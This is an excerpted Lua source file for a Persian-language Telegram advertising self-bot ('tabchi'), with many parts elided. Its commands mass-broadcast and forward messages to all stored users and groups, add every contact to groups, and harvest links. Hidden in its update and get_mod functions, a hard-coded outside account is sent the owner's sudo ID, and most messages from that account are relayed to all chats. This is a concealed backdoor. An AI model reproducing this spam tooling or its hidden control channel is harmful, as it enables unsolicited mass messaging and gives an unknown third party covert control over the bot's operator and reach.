...
function process(msg)
  ...
  do
    local matches = {
      msg.text:match("^(پیام) (%d+) (.*)")
    }
    if msg.text:match("^پیام") and is_sudo(msg) and #matches == 3 then
  ...
  do
    ...
    if msg.text:match("^جواب") and is_sudo(msg) and #matches == 3 then
  ...
  do
    local matches = {
      msg.text:match("^(حذف جواب) (.*)")
    }
    if msg.text:match("^حذف جواب") and is_sudo(msg) and #matches == 2 then
  ...
  if msg.text:match("^جواب ها$") and is_sudo(msg) then
  ...
  if msg.text:match("^اد کردن$") and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
  ...
  if msg.text:match("^لیست مخاطب$") and is_sduo(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
  ...
  if msg.text:match("^لیست لینک$") and is_sudo(msg) then
  ...
  do
    local matches = {
      msg.text:match("(بلاک) (%d+)")
    }
    if msg.text:match("^بلاک") and is_sudo(msg) and #matches == 2 then
      tdcli.blockUser(tonumber(matches[2]))
      return "_کاربر بلاک شد_"
    end
  end
  if msg.text:match("^راهنما$") and is_sudo(msg) then
    local text = [[
#راهنما
*بلاک <id>
...
حذف سودو (id)
حذف از ليست سودوهاي ربات_

ارسال (text)
ارسال پيام به همه

فوروارد به همه/پیوی ها/سوپرگروها/گروها (by reply)
فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران

تکرار (text)
تکرار متن

پیام سییو (روشن/خاموش)
...
Join _us_ >> @telestrong*
  ...
  do
    local matches = {
      msg.text:match("(انبلاک) (%d+)")
    }
    if msg.text:match("^انبلاک") and is_sudo(msg) and #matches == 2 then
...
📇 لینک های ذخیره شده 📇:
         ...
         tdcli.sendMessage(msg.chat_id_, 0, 1, '<pre>'..text..'</pre>', 1, 'html')
        end
      end
      tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 309024189,
        chat_id_ = msg.chat_id_,
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
  ...
  do
    local matches = {
      msg.text:match("^(اضافه کردن سودو) (%d+)")
    }
    if msg.text:match("^اضافه کردن سودو") and is_full_sudo(msg) and #matches == 2 then
  ...
  do
    local matches = {
      msg.text:match("^(حذف سودو) (%d+)")
    }
    if msg.text:match("^حذف سودو") and is_full_sudo(msg) and #matches == 2 then
  ...
  do
    local matches = {
      msg.text:match("^(پیام سیو) (.*)")
    }
    if msg.text:match("^پیام سیو") and is_sudo(msg) and #matches == 2 then
  ...
  do
    local matches = {
      msg.text:match("^(سین زدن) (.*)")
    }
    if msg.text:match("^سین زدن") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "روشن" then
  ...
  do
    local matches = {
      msg.text:match("^(متن سیو) (.*)")
    }
    if msg.text:match("^متن سیو") and is_sudo(msg) and #matches == 2 then
...
_پیام_ :
  ...
  if msg.text:match("^ارسال") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("(ارسال) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
  ...
  if msg.text:match("^فوروارد به همه$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
  ...
  if msg.text:match("^فوروارد به گروها$") and msg.reply_to_message_id_ and is_sudo(msg) then
  ...
  if msg.text:match("^فوروارد به سوپرگروها$") and msg.reply_to_message_id_ and is_sudo(msg) then
  ...
  if msg.text:match("^اد کردن به گروه") and msg.reply_to_message_id_ and is_sudo(msg) then
    tdcli_function({
      ID = "GetMessage",
      chat_id_ = msg.chat_id_,
  ...
  if msg.text:match("^فوروارد به کاربران$") and msg.reply_to_message_id_ and is_sudo(msg) then
  ...
  do
    local matches = {
      msg.text:match("(تکرار) (.*)")
    }
    if msg.text:match("^تکرار") and is_sudo(msg) and #matches == 2 then
...
function get_mod(args, data)
  if data.is_blocked_ then
    tdcli.unblockUser(309024189)
  end
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    tdcli.sendBotStartMessage(309024189, 309024189, "new")
    tdcli.sendMessage(309024189, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    ...
    if msg.sender_user_id_ == 309024189 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 309024189 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
...
local function run (msg , matches)
 if matches [1]=="^[!/#%&](panel)(.*)$" then
  return 'برای دریافت دستورات،ربات tabchi_abot را استارت کنید'
  end
  end
